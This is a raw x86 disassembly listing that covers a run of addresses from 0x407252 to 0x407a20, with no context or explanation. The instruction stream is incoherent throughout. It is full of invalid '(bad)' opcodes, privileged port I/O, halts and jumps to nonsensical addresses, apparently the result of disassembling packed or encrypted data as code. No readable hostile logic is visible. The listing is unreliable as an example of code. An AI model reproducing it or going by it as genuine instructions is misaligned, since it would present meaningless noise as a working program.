  407252:	jb     0x40724c
  407254:	push   ds
  407255:	cmp    eax,0xb261c58f
  40725a:	pop    ecx
  40725b:	mov    ch,0x66
  40725d:	pop    edi
  40725e:	sub    ebp,ebp
  407260:	pop    eax
  407261:	jecxz  0x407276
  407263:	sub    DWORD PTR [edx-0x23],0x5b
  407267:	mov    ah,0xe6
  407269:	cs daa 
  40726b:	mov    ebx,0x1407a212
  407270:	cmp    ecx,edx
  407272:	(bad)  
  407273:	out    dx,al
  407274:	das    
  407275:	and    esi,edx
  407277:	repz pusha 
  407279:	jp     0x4071fb
  40727b:	fs data16 and ah,cl
  40727f:	mov    bh,0xc
  407281:	sub    al,0xa1
  407283:	das    
  407284:	pop    ebx
  407285:	xchg   ecx,eax
  407286:	dec    esi
  407287:	and    eax,0x94c17e7a
  40728c:	std    
  40728d:	loop   0x4072b6
  40728f:	enter  0x6d4a,0xb7
  407293:	pop    edx
  407294:	sub    bl,BYTE PTR [eax]
  407296:	aam    0x1a
  407298:	ds lock in eax,dx
  40729b:	mov    eax,0x1c65568d
  4072a0:	cmp    eax,0x5486dffe
  4072a5:	pusha  
  4072a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072a7:	rol    BYTE PTR [edi+edi*8-0x1e],0x56
  4072ac:	test   DWORD PTR [ebx+0x3f9d710a],ecx
  4072b2:	push   ss
  4072b3:	outs   dx,BYTE PTR ds:[esi]
  4072b4:	push   cs
  4072b5:	push   ebp
  4072b6:	mov    cl,0xc1
  4072b8:	mov    eax,0xd7d7d205
  4072bd:	iret   
  4072be:	fimul  DWORD PTR ds:0xa969f03
  4072c4:	mov    ss,WORD PTR [ebx-0x4c]
  4072c7:	pop    ecx
  4072c8:	inc    BYTE PTR [ebp+eiz*2-0x731328af]
  4072cf:	cld    
  4072d0:	push   ss
  4072d1:	inc    ecx
  4072d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072d4:	pop    esi
  4072d5:	mov    dh,0x76
  4072d7:	dec    eax
  4072d8:	test   eax,0xe3784908
  4072dd:	mov    ch,0xd8
  4072df:	stos   DWORD PTR es:[edi],eax
  4072e0:	jp     0x4072c3
  4072e2:	and    bh,BYTE PTR [esi-0x18199667]
  4072e8:	fucom  st(7)
  4072ea:	cld    
  4072eb:	pop    edx
  4072ec:	(bad)  
  4072ed:	jg     0x4072fe
  4072ef:	clc    
  4072f0:	push   edi
  4072f1:	mov    al,0xd7
  4072f3:	mov    cl,0x93
  4072f5:	gs add dl,cl
  4072f8:	cmp    BYTE PTR ds:0xcfd058f9,0xc5
  4072ff:	int    0x4f
  407301:	lods   eax,DWORD PTR ds:[esi]
  407302:	out    dx,al
  407303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407304:	fcomp  st(5)
  407306:	xchg   esp,eax
  407307:	jg     0x40736c
  407309:	fstp   st(2)
  40730b:	das    
  40730c:	sahf   
  40730d:	cwde   
  40730e:	mov    DWORD PTR [esi],ebp
  407310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407311:	aam    0x5d
  407313:	jp     0x40736e
  407315:	ror    DWORD PTR [esi-0x485d3866],1
  40731b:	adc    ch,0xf1
  40731e:	pop    edi
  40731f:	xchg   esp,eax
  407320:	xor    eax,0xf2a9879a
  407325:	jno    0x407388
  407327:	loope  0x407323
  407329:	dec    esp
  40732a:	jo     0x4073a3
  40732c:	mov    cs,WORD PTR ds:0xc8255500
  407332:	or     dl,ch
  407334:	mov    ah,0x4d
  407336:	in     al,0xdb
  407338:	sbb    bh,bl
  40733a:	dec    eax
  40733b:	mov    cl,0x6a
  40733d:	xor    BYTE PTR [ebp-0x1ecabb3b],0xe8
  407344:	imul   BYTE PTR [eax-0x3d]
  407347:	push   0x4e
  407349:	push   0xca3c4505
  40734e:	mov    ecx,0x2ca8f8fc
  407353:	adc    eax,0x9ef2ec5
  407358:	fidivr DWORD PTR [edi]
  40735a:	sub    eax,0x12daad43
  40735f:	call   0xb27ab261
  407364:	jmp    0xd9b56801
  407369:	(bad)  
  40736a:	xor    cl,BYTE PTR [eax+0x52]
  40736d:	xor    bl,BYTE PTR [edx+esi*2]
  407370:	xchg   edi,eax
  407371:	ret    
  407372:	push   edi
  407373:	mov    ecx,DWORD PTR ss:[ebx-0x8b5a0af]
  40737a:	test   DWORD PTR [edx],esp
  40737c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40737d:	cmc    
  40737e:	jecxz  0x40734f
  407380:	mov    ecx,0xac676037
  407385:	mov    edi,0xd0aa5f6b
  40738a:	imul   ecx,DWORD PTR [edi],0x15
  40738d:	fadd   DWORD PTR [ecx+0x5f449bc0]
  407393:	mov    ecx,0xf4e23f9a
  407398:	fstp   QWORD PTR [edx]
  40739a:	int    0x34
  40739c:	lock adc al,0xb8
  40739f:	xor    DWORD PTR [eax-0x73],ecx
  4073a2:	dec    edi
  4073a3:	cs mov edx,0xab8ac95b
  4073a9:	pop    esi
  4073aa:	mov    al,ds:0x286227f0
  4073af:	in     eax,0xd9
  4073b1:	cs icebp 
  4073b3:	cmp    BYTE PTR [esi*1+0x1d676007],bh
  4073ba:	mov    ebp,0x4b0a55c4
  4073bf:	out    dx,al
  4073c0:	pop    cx
  4073c2:	push   edi
  4073c3:	mov    dl,0x4f
  4073c5:	ja     0x4073f6
  4073c7:	imul   ecx,esp,0xc741293a
  4073cd:	jl     0x4073c8
  4073cf:	das    
  4073d0:	push   edx
  4073d1:	test   DWORD PTR [ebp+0x4f7940c7],edi
  4073d7:	out    0x0,eax
  4073d9:	mov    ebp,0x987c98bb
  4073de:	inc    esi
  4073df:	repnz mov es,WORD PTR [ebx-0x3a]
  4073e3:	mov    ch,0x2d
  4073e5:	mov    DWORD PTR [esi+0x43a40dff],0x34312684
  4073ef:	push   0xa63be750
  4073f4:	dec    esp
  4073f5:	scas   eax,DWORD PTR es:[edi]
  4073f6:	lods   al,BYTE PTR ds:[esi]
  4073f7:	sub    ecx,edi
  4073f9:	sub    bl,al
  4073fb:	adc    BYTE PTR [ecx-0x6c],0x14
  4073ff:	mov    DWORD PTR [ecx],ebp
  407401:	add    dh,BYTE PTR [esi]
  407403:	pop    ecx
  407404:	mov    edi,0xe64a3b4c
  407409:	enter  0x6c9,0xcf
  40740d:	xchg   ebp,eax
  40740e:	(bad)  [ecx+eax*1]
  407411:	sub    DWORD PTR [ebx-0x1d],0xffffff84
  407415:	add    DWORD PTR [esi-0x7a504330],edx
  40741b:	ficomp WORD PTR [ebx+ebx*2-0x5]
  40741f:	mov    ch,0xc7
  407421:	icebp  
  407422:	jns    0x4073ea
  407424:	(bad)  
  407425:	shl    BYTE PTR [edi+0x7adfd7d0],0xa3
  40742c:	(bad)  
  40742d:	js     0x40740c
  40742f:	fs (bad) 
  407432:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  407434:	jae    0x4073c2
  407436:	(bad)  
  407438:	repz (bad) 
  40743a:	or     DWORD PTR [ebp-0x59],ebx
  40743d:	mov    BYTE PTR [ebx+ebx*8+0x0],ch
  407441:	inc    ecx
  407442:	rcr    DWORD PTR [esi-0x4d],1
  407445:	out    0xf7,eax
  407447:	pop    ds
  407448:	std    
  407449:	mov    al,0xe1
  40744b:	fisubr DWORD PTR [edx+eax*4]
  40744e:	imul   ecx,ebx,0x32f196
  407454:	jne    0x4073e5
  407456:	inc    ecx
  407457:	shl    bh,cl
  407459:	lock scas al,BYTE PTR es:[edi]
  40745b:	adc    al,0xd6
  40745d:	mov    esi,0xa52e60c8
  407462:	dec    esp
  407463:	lock or DWORD PTR [esi+edx*4+0x42],ecx
  407468:	jae    0x407462
  40746a:	sbb    eax,0x430a2f96
  40746f:	lahf   
  407470:	cld    
  407471:	jb     0x4074d6
  407473:	mov    eax,0x579977fc
  407478:	pop    edi
  407479:	inc    esi
  40747b:	and    eax,0xbbd36f54
  407480:	inc    edi
  407481:	xor    eax,0xdfe89866
  407486:	pop    esi
  407487:	imul   DWORD PTR [edi]
  407489:	or     eax,0x86cf9fd3
  40748e:	xchg   esi,eax
  40748f:	aad    0xd0
  407491:	sub    al,0xa1
  407493:	adc    edx,0x3b0409d1
  407499:	sub    ch,al
  40749b:	addr16 test eax,0x8eb4c190
  4074a1:	(bad)
  4074a4:	dec    ebx
  4074a5:	xlat   BYTE PTR ds:[ebx]
  4074a6:	or     DWORD PTR [edx+0x73],ebp
  4074a9:	out    dx,al
  4074aa:	jnp    0x40751e
  4074ac:	jecxz  0x4074ce
  4074ae:	cmp    DWORD PTR [edi],0xfffffffb
  4074b1:	jmp    0x1681:0x3fb0a92a
  4074b8:	test   al,al
  4074ba:	fst    QWORD PTR [eax-0x242b1e6]
  4074c0:	adc    dh,BYTE PTR [ebx+ebp*8-0x4d00442d]
  4074c7:	cmp    ah,bh
  4074c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074ca:	inc    esi
  4074cb:	add    dh,BYTE PTR [ebx+ecx*8+0x5a]
  4074cf:	mov    ah,0x46
  4074d1:	push   es
  4074d2:	fadd   DWORD PTR ds:0x6a34a144
  4074d8:	xchg   BYTE PTR [ebx],cl
  4074da:	lods   eax,DWORD PTR ds:[esi]
  4074db:	pop    ebp
  4074dc:	mov    ebp,eax
  4074de:	xchg   DWORD PTR [ecx],edi
  4074e0:	and    cl,bl
  4074e2:	dec    edx
  4074e3:	fsub   QWORD PTR [eax-0x80]
  4074e6:	jns    0x4074a4
  4074e8:	push   ds
  4074e9:	shl    DWORD PTR [ebx+0x28],0x5f
  4074ed:	int3   
  4074ee:	cdq    
  4074ef:	in     eax,0x27
  4074f1:	mov    edi,0x16aa290c
  4074f6:	xchg   ebx,eax
  4074f7:	ror    al,0x43
  4074fa:	fstp   TBYTE PTR [esi-0x47a3fa69]
  407500:	mov    dl,0xb6
  407502:	pop    ebx
  407503:	mul    ebp
  407505:	pop    esi
  407506:	jae    0x40752b
  407508:	daa    
  407509:	jns    0x407567
  40750b:	cs retf 0xf28
  40750f:	cmc    
  407510:	out    dx,al
  407511:	leave  
  407512:	aaa    
  407513:	adc    al,0x95
  407515:	jg     0x407504
  407517:	nop
  407518:	pop    edi
  407519:	push   ds
  40751a:	int    0x66
  40751c:	push   0xffffffa5
  40751e:	add    DWORD PTR [esi],esp
  407520:	jb     0x40758d
  407522:	outs   dx,BYTE PTR ds:[esi]
  407523:	test   al,0xe6
  407525:	and    ecx,DWORD PTR ds:0x8b37dc1a
  40752b:	xchg   edi,eax
  40752c:	and    ecx,DWORD PTR [edx+0x34533fa7]
  407532:	hlt    
  407533:	xor    eax,0x87c82ef7
  407538:	and    DWORD PTR [ebp+0x30],0x6ac7fd84
  40753f:	mul    DWORD PTR [ebp-0x6e]
  407542:	inc    esp
  407543:	out    0x3f,eax
  407545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407546:	add    BYTE PTR [ebx],bl
  407548:	pop    esp
  407549:	call   0xdf16fffa
  40754e:	enter  0xfa44,0xac
  407552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407553:	cmp    bh,BYTE PTR [esi+eax*8]
  407556:	retf   0x15fc
  407559:	mov    esi,0x18f933e9
  40755e:	das    
  40755f:	popa   
  407560:	jo     0x407599
  407562:	xchg   ecx,eax
  407563:	inc    esi
  407564:	rcr    DWORD PTR [ebx],1
  407566:	sbb    dl,BYTE PTR [eax+0x65]
  407569:	(bad)  
  40756a:	(bad)  
  40756b:	cmp    cl,BYTE PTR [ecx*1-0x2bb94f1d]
  407572:	pushf  
  407573:	jle    0x407580
  407575:	sar    BYTE PTR [eax-0x3c],0xf0
  407579:	sub    eax,0x34e93480
  40757e:	loope  0x40758a
  407580:	mov    ds:0x879060a,al
  407585:	(bad)  
  407586:	scas   al,BYTE PTR es:[edi]
  407587:	pop    esp
  407588:	cld    
  407589:	mov    bl,0x5d
  40758b:	pop    ecx
  40758c:	adc    BYTE PTR [edx-0xb],0xf0
  407590:	fst    DWORD PTR [esi]
  407592:	push   es
  407593:	cwde   
  407594:	pop    eax
  407595:	inc    ebp
  407596:	pop    esi
  407597:	mov    cl,BYTE PTR [edx]
  407599:	inc    ecx
  40759a:	add    al,0x1e
  40759c:	ret    0xcbb9
  40759f:	xor    al,0x7
  4075a1:	jb     0x407585
  4075a3:	test   eax,0x52c2c11b
  4075a8:	retf   0x2254
  4075ab:	pusha  
  4075ac:	push   edi
  4075ad:	sti    
  4075ae:	pop    ecx
  4075af:	jo     0x407620
  4075b1:	test   esp,0xbb65a7ae
  4075b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b8:	push   edx
  4075b9:	pop    es
  4075ba:	push   0x2dcab32c
  4075bf:	inc    edx
  4075c0:	repz in eax,0x9d
  4075c3:	lds    esi,FWORD PTR [edi+0x4bcf3e6a]
  4075c9:	mul    DWORD PTR [ecx-0x5b]
  4075cc:	push   ecx
  4075cd:	or     eax,0x99f395d4
  4075d2:	push   es
  4075d3:	adc    ebp,0xbe4603d5
  4075d9:	ja     0x4075b1
  4075db:	mov    ah,0x9a
  4075dd:	not    DWORD PTR [esi]
  4075df:	cmp    dl,al
  4075e1:	pop    esi
  4075e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075e3:	adc    sp,WORD PTR [ebp-0x29]
  4075e7:	jmp    0x1371d0f6
  4075ec:	jge    0x40763d
  4075ee:	(bad)  
  4075ef:	les    esi,FWORD PTR [edi]
  4075f1:	or     ebp,DWORD PTR [ecx+0x6b]
  4075f4:	cwde   
  4075f5:	test   al,0x79
  4075f7:	ror    BYTE PTR [eax-0x77],1
  4075fa:	int3   
  4075fb:	and    al,0xae
  4075fd:	mov    edi,0xf529bcfe
  407602:	jnp    0x407585
  407604:	gs xchg ebp,eax
  407606:	mov    eax,0xcf47bc65
  40760b:	shl    DWORD PTR [edx+eiz*2],cl
  40760e:	scas   al,BYTE PTR es:[edi]
  40760f:	out    dx,al
  407610:	push   ebp
  407611:	mov    eax,ds:0x2d7776cc
  407616:	sti    
  407617:	not    dh
  407619:	ja     0x407610
  40761b:	call   0xe7bd8497
  407620:	sahf   
  407621:	push   ebx
  407622:	push   ecx
  407623:	jne    0x407664
  407625:	sub    al,dh
  407627:	xor    esi,DWORD PTR [esi+0x28]
  40762a:	int    0xa1
  40762c:	(bad)  
  40762e:	adc    ebx,ebx
  407630:	cmp    al,0x6
  407632:	jle    0x4075d5
  407634:	mov    dh,0x71
  407636:	pop    ss
  407637:	fs jecxz 0x4075f4
  40763a:	lods   al,BYTE PTR ds:[esi]
  40763b:	mov    dl,0x24
  40763d:	jmp    0x4075f5
  40763f:	je     0x40765e
  407641:	or     BYTE PTR ds:0xc680ad9f,0xd8
  407648:	shl    BYTE PTR [eax],cl
  40764a:	je     0x407622
  40764c:	mov    ah,0x77
  40764e:	arpl   WORD PTR [esi+0x26],bp
  407651:	fimul  DWORD PTR [edi+edx*4]
  407654:	retf   
  407655:	xchg   dl,bh
  407657:	je     0x407699
  407659:	adc    DWORD PTR [esp+edi*1],esi
  40765c:	out    dx,al
  40765d:	sbb    al,0x60
  40765f:	mov    esp,DWORD PTR ds:0x7e179db7
  407665:	xor    al,0xb5
  407667:	inc    esi
  407668:	cmp    eax,0xdf06b8ff
  40766d:	leave  
  40766e:	in     eax,0xbb
  407670:	adc    BYTE PTR [esi],bl
  407672:	push   eax
  407673:	shl    bh,cl
  407675:	mov    edi,0xae2c1cb3
  40767a:	push   ecx
  40767b:	mov    cs,WORD PTR [edx+0x7be42c50]
  407681:	mov    edi,0x9665316f
  407686:	je     0x4076cd
  407688:	test   DWORD PTR [ebx+ebp*1],edi
  40768b:	das    
  40768c:	imul   esp,DWORD PTR [ecx],0xe89ab114
  407692:	xor    eax,0x1778cf81
  407697:	movhps xmm3,QWORD PTR ds:0x143cd16c
  40769e:	mov    al,ds:0xe85901d5
  4076a3:	vmwrite esi,DWORD PTR [edx+0x2e03a760]
  4076aa:	mov    ah,0xfe
  4076ac:	ds das 
  4076ae:	scas   eax,DWORD PTR es:[edi]
  4076af:	test   edx,0x6ce60ae
  4076b5:	and    DWORD PTR [edi+esi*2],ebp
  4076b8:	sub    al,0x48
  4076ba:	add    BYTE PTR [esi+0x722e66d9],dh
  4076c0:	jnp    0x4076d8
  4076c2:	push   ebp
  4076c3:	mov    bl,0x24
  4076c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c6:	sbb    DWORD PTR [edx],0x6
  4076c9:	sub    ecx,eax
  4076cb:	sub    BYTE PTR [eax+0x11a10900],dh
  4076d1:	jmp    0x40768d
  4076d3:	dec    edi
  4076d4:	pop    ebx
  4076d5:	add    dl,BYTE PTR [ebp-0x33]
  4076d8:	xchg   esi,eax
  4076d9:	ret    0xf57
  4076dc:	pop    esp
  4076dd:	xchg   ebx,eax
  4076de:	adc    DWORD PTR [eax],0x6a
  4076e1:	fcomip st,st(2)
  4076e3:	rol    dh,cl
  4076e5:	das    
  4076e6:	pop    ebx
  4076e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076e8:	out    dx,al
  4076e9:	dec    esp
  4076ea:	mov    bl,0x84
  4076ec:	mov    dl,0x9f
  4076ee:	popa   
  4076ef:	pushf  
  4076f0:	int3   
  4076f1:	fcomp  DWORD PTR [ecx]
  4076f3:	sbb    ah,BYTE PTR [ebx]
  4076f5:	mov    WORD PTR [ebp-0x77e63e26],ss
  4076fb:	clc    
  4076fc:	and    al,0xa1
  4076fe:	jnp    0x4076f5
  407700:	push   cs
  407701:	pop    ds
  407702:	jno    0x407762
  407704:	adc    cl,BYTE PTR [ebx-0x21d99c78]
  40770a:	jmp    0xbfa797fb
  40770f:	and    edx,DWORD PTR [ebp+0x17]
  407712:	mov    ss,WORD PTR [edi+eiz*2]
  407715:	mov    al,0xb1
  407717:	(bad)  
  407718:	std    
  407719:	xchg   ecx,eax
  40771a:	sub    ebp,DWORD PTR [eax]
  40771c:	and    esp,edi
  40771e:	sub    ecx,ecx
  407720:	adc    DWORD PTR [eax+esi*2+0x5b9f25b4],ebp
  407727:	mov    ds:0xe4a2fae1,al
  40772c:	dec    ebp
  40772d:	xchg   ecx,eax
  40772e:	push   cs
  40772f:	cmp    al,0x5
  407731:	adc    bl,al
  407733:	hlt    
  407734:	mov    DWORD PTR [edi-0x2e],edx
  407737:	push   ecx
  407738:	cdq    
  407739:	enter  0x53f9,0xd3
  40773d:	fst    DWORD PTR [edi]
  40773f:	mov    al,ds:0xcc96585d
  407744:	ror    ebp,cl
  407746:	aas    
  407747:	shl    ah,cl
  407749:	pop    ecx
  40774a:	call   0xd12d:0x370af008
  407751:	and    al,0xf6
  407753:	retf   0x7b1f
  407756:	xchg   edi,eax
  407757:	push   esi
  407758:	mov    eax,ds:0x1dd1c393
  40775d:	sub    al,0x7c
  40775f:	je     0x407799
  407761:	sub    BYTE PTR [edi-0x2b],0x5c
  407765:	jo     0x40779d
  407767:	sahf   
  407768:	mov    esp,0xabb2756b
  40776d:	cmp    ah,BYTE PTR [ecx]
  40776f:	iret   
  407770:	les    esp,FWORD PTR [edx]
  407772:	loopne 0x4077d3
  407774:	push   ecx
  407775:	aaa    
  407776:	add    ch,BYTE PTR [eax+0x4fcd1b93]
  40777c:	nop
  40777d:	out    0x40,al
  40777f:	adc    bh,BYTE PTR [eax+0x27]
  407782:	hlt    
  407783:	mov    al,ds:0xab7c95fa
  407788:	test   BYTE PTR [esi+0x28d4f064],cl
  40778e:	xchg   ebp,eax
  40778f:	lock ror ch,1
  407792:	and    edx,DWORD PTR [ecx-0x1b]
  407795:	mov    ch,0x59
  407797:	out    dx,eax
  407798:	hlt    
  407799:	ret    0x627a
  40779c:	imul   eax,edi,0xffffffe2
  40779f:	mov    ch,0xba
  4077a1:	cs aad 0x9a
  4077a4:	adc    al,0x12
  4077a6:	sbb    bl,BYTE PTR [ebx+0x6f]
  4077a9:	mov    al,ds:0xd31cbe1d
  4077ae:	cmp    al,0x9b
  4077b0:	leave  
  4077b1:	data16 jmp 0x40781e
  4077b4:	cmp    esp,DWORD PTR [esi-0x6fa32e0b]
  4077ba:	les    ebp,FWORD PTR ds:0xbfa9a47a
  4077c0:	add    ebp,DWORD PTR [eax]
  4077c2:	jbe    0x407806
  4077c4:	loope  0x4077c1
  4077c6:	mov    ds:0xe54f1614,al
  4077cb:	mov    cl,0xad
  4077cd:	push   ss
  4077ce:	mov    dh,0x8c
  4077d0:	sub    eax,0x994ce5dd
  4077d5:	lods   eax,DWORD PTR ds:[esi]
  4077d6:	lods   eax,DWORD PTR ds:[esi]
  4077d7:	xor    BYTE PTR [esp+edx*8+0x3076599e],0x6a
  4077df:	test   eax,0x2f2589d6
  4077e4:	jge    0x40778b
  4077e6:	push   0x5cc967f0
  4077eb:	dec    edi
  4077ec:	leave  
  4077ed:	add    dh,BYTE PTR [edx-0xebfa8ee]
  4077f3:	fucom  st(1)
  4077f5:	mov    ds:0xb03e09c1,eax
  4077fa:	rcr    DWORD PTR [edi-0x61],1
  4077fd:	inc    ebx
  4077fe:	aam    0x6b
  407800:	cwde   
  407801:	dec    edi
  407802:	mov    BYTE PTR [ebx],bl
  407804:	pop    ss
  407805:	(bad)
  407809:	xchg   edx,eax
  40780a:	mov    fs,esi
  40780c:	mov    ch,0xa0
  40780e:	inc    eax
  40780f:	enter  0xdf6c,0xeb
  407813:	outs   dx,DWORD PTR ds:[esi]
  407814:	popf   
  407815:	inc    edi
  407816:	fcomp  st(5)
  407818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407819:	mov    cl,0x1e
  40781b:	aas    
  40781c:	inc    ebp
  40781d:	push   esi
  40781e:	loopne 0x407810
  407820:	stc    
  407821:	mov    bh,0x39
  407823:	inc    ebp
  407824:	in     eax,dx
  407825:	fcompp 
  407827:	cmp    ah,BYTE PTR [eax-0x76c85cf7]
  40782d:	adc    ebp,DWORD PTR [edx+0x2352e15]
  407833:	cs add al,0x71
  407836:	out    dx,al
  407837:	adc    al,0x4d
  407839:	mov    bh,BYTE PTR [eax]
  40783b:	inc    edi
  40783c:	int    0x7f
  40783e:	fistp  QWORD PTR [edx+0x1af68524]
  407844:	adc    BYTE PTR [edi+0x11b39df0],dh
  40784a:	jo     0x407823
  40784c:	pop    eax
  40784d:	aas    
  40784e:	ins    DWORD PTR es:[edi],dx
  40784f:	inc    esp
  407850:	das    
  407851:	es call 0x3084:0xc1fb72e9
  407859:	(bad)  
  40785a:	push   esp
  40785b:	mov    bh,0x4
  40785d:	setge  BYTE PTR [eax+0x31]
  407861:	cmp    al,0xaa
  407863:	dec    cl
  407865:	ins    DWORD PTR es:[edi],dx
  407866:	jb     0x4078b2
  407868:	dec    esi
  407869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40786a:	pusha  
  40786b:	bound  ecx,QWORD PTR [ebp+ebp*8-0x3da22763]
  407872:	daa    
  407873:	mov    esp,0x3e857d3c
  407878:	loope  0x4078a8
  40787a:	push   ds
  40787b:	scas   eax,DWORD PTR es:[edi]
  40787c:	mov    ds:0x822102fc,eax
  407881:	sub    BYTE PTR [ecx],dl
  407883:	push   esi
  407884:	(bad)  
  407886:	mov    al,BYTE PTR [edx+eiz*8]
  407889:	inc    esp
  40788a:	xchg   ebx,eax
  40788b:	xchg   ebx,eax
  40788c:	sbb    BYTE PTR [ebp+0x1ac83904],al
  407892:	pop    es
  407893:	cmp    DWORD PTR ds:0x1d9f508b,0xffffffcc
  40789a:	retf   0xb2a
  40789d:	jg     0x40790d
  40789f:	xor    BYTE PTR [edi-0x1c],0x1f
  4078a3:	dec    ecx
  4078a4:	iret   
  4078a5:	push   gs
  4078a7:	pop    es
  4078a8:	daa    
  4078a9:	or     al,0xc3
  4078ab:	aas    
  4078ac:	mov    ch,0xcf
  4078ae:	cwde   
  4078af:	gs mov edi,0x971b040f
  4078b5:	retf   0x1dbc
  4078b8:	dec    eax
  4078b9:	jae    0x4078a0
  4078bb:	sub    eax,DWORD PTR [ecx-0x5a]
  4078be:	and    al,BYTE PTR [ebp+0x7c503a6f]
  4078c4:	xchg   ecx,eax
  4078c5:	inc    esi
  4078c6:	xchg   edi,eax
  4078c7:	pop    ss
  4078c8:	iret   
  4078c9:	stc    
  4078ca:	int3   
  4078cb:	cmc    
  4078cc:	out    dx,al
  4078cd:	add    dh,BYTE PTR [esi+edx*1-0x7b]
  4078d1:	sbb    BYTE PTR [edx+0x4f94eea],bh
  4078d7:	mov    DWORD PTR [esi+edi*1-0x7cffc8e5],0x676d218d
  4078e2:	and    BYTE PTR [ecx+eax*4-0x62938aad],0x7a
  4078ea:	call   0x4f598e34
  4078ef:	in     eax,0x18
  4078f1:	out    dx,al
  4078f2:	scas   eax,DWORD PTR es:[edi]
  4078f3:	test   BYTE PTR [esi+0x52cbac32],dh
  4078f9:	adc    ch,bh
  4078fb:	mov    cl,0x41
  4078fd:	pusha  
  4078fe:	(bad)  
  407900:	in     eax,dx
  407901:	jbe    0x40791e
  407903:	iret   
  407904:	in     al,dx
  407905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407906:	(bad)  
  407907:	in     eax,dx
  407908:	mov    WORD PTR [bp+si+0x4fe5],ss
  40790d:	mov    ebx,0x354d6861
  407912:	test   DWORD PTR [esi+0x75],esp
  407915:	jecxz  0x4078c7
  407917:	repnz loop 0x407961
  40791a:	adc    dh,BYTE PTR [edi-0x6f]
  40791d:	mov    cl,0x9d
  40791f:	push   ebp
  407920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407921:	gs inc esp
  407923:	push   ebx
  407924:	push   ebp
  407925:	mov    bh,0x5a
  407927:	in     al,0xaf
  407929:	xchg   ebx,eax
  40792a:	into   
  40792b:	addr16 inc esi
  40792d:	ins    BYTE PTR es:[edi],dx
  40792e:	ins    DWORD PTR es:[edi],dx
  40792f:	inc    edx
  407930:	mov    ebx,0xa05a0462
  407935:	mov    WORD PTR [eax-0x49f2831e],ss
  40793b:	and    DWORD PTR [ebp+0x4a],ecx
  40793e:	cmp    esi,DWORD PTR [eax+0x1dfc7205]
  407944:	pop    eax
  407945:	inc    ebx
  407946:	jmp    0x334139d9
  40794b:	ins    DWORD PTR es:[edi],dx
  40794c:	jp     0x4079bf
  40794e:	xor    DWORD PTR [ebp-0x72],0x68764ad2
  407955:	push   edi
  407956:	inc    esi
  407957:	sbb    BYTE PTR [esi+0x78ec9aa4],ah
  40795d:	stos   BYTE PTR es:[edi],al
  40795e:	fsub   st,st(7)
  407960:	xor    BYTE PTR [eax],cl
  407962:	aad    0xcc
  407964:	pop    ds
  407965:	and    al,0x95
  407967:	add    DWORD PTR [esi+0xe],edi
  40796a:	xchg   ebp,eax
  40796b:	mov    gs,ecx
  40796d:	into   
  40796e:	fsubrp st(7),st
  407970:	adc    ebx,edx
  407972:	inc    ecx
  407973:	mov    eax,0x6c2e8830
  407978:	hlt    
  407979:	leave  
  40797a:	pop    ebx
  40797b:	dec    edx
  40797c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797d:	mov    ds:0xbd7afc25,eax
  407982:	iret   
  407983:	cli    
  407984:	nop
  407985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407986:	out    dx,al
  407987:	add    edi,DWORD PTR [ebx+eiz*4-0x7a]
  40798b:	aad    0x41
  40798d:	jmp    0x4707b584
  407992:	adc    ebx,DWORD PTR [edx]
  407994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407996:	or     bh,cl
  407998:	cwde   
  407999:	jge    0x407963
  40799b:	in     eax,dx
  40799c:	ins    DWORD PTR es:[edi],dx
  40799d:	mov    edx,0x674d24bf
  4079a2:	rcl    BYTE PTR [edx-0x7f],1
  4079a5:	cmp    esi,DWORD PTR [edi+edi*8+0x1f]
  4079a9:	inc    ebp
  4079aa:	scas   eax,DWORD PTR es:[edi]
  4079ab:	sbb    DWORD PTR [edi-0x16],esp
  4079ae:	dec    eax
  4079af:	pop    ebp
  4079b0:	pop    es
  4079b1:	xchg   DWORD PTR [edi+0x2b2906a8],esp
  4079b7:	mov    ss,WORD PTR [edi+0x3011f5bd]
  4079bd:	mov    BYTE PTR [esi+0x6f9bcb84],cl
  4079c3:	ret    0x5098
  4079c6:	fadd   DWORD PTR [ebp-0x26d3d4ec]
  4079cc:	sub    eax,0x3022fbb5
  4079d1:	out    0xc8,eax
  4079d3:	arpl   WORD PTR [esi+0x5e],di
  4079d6:	mov    esp,0x303014b3
  4079db:	shl    DWORD PTR [edi+0x7a27b5b9],cl
  4079e1:	jle    0x4079ce
  4079e3:	js     0x4079c6
  4079e5:	leave  
  4079e6:	mov    ecx,0x56d547f3
  4079eb:	xor    eax,0x7a6a9567
  4079f0:	add    ecx,DWORD PTR [ebx]
  4079f2:	fist   DWORD PTR [ebx]
  4079f4:	inc    ebp
  4079f5:	test   al,0x56
  4079f7:	cld    
  4079f8:	adc    ch,BYTE PTR [esi+0x6e]
  4079fb:	rcr    cl,0x5a
  4079fe:	call   0x3c8b54f9
  407a03:	cmc    
  407a04:	lea    ebp,[edi]
  407a06:	sbb    BYTE PTR [esi],ah
  407a08:	push   0x661b14e2
  407a0d:	fmul   st,st(0)
  407a0f:	fdivp  st(5),st
  407a11:	dec    edi
  407a12:	xor    al,0x16
  407a14:	push   es
  407a15:	stc    
  407a16:	inc    ebx
  407a17:	fcom   QWORD PTR [esi+0x4ebc3233]
  407a1d:	imul   ebp,esp,0xffffffdb
  407a20:	jmp    0x6519:0x15e1689c
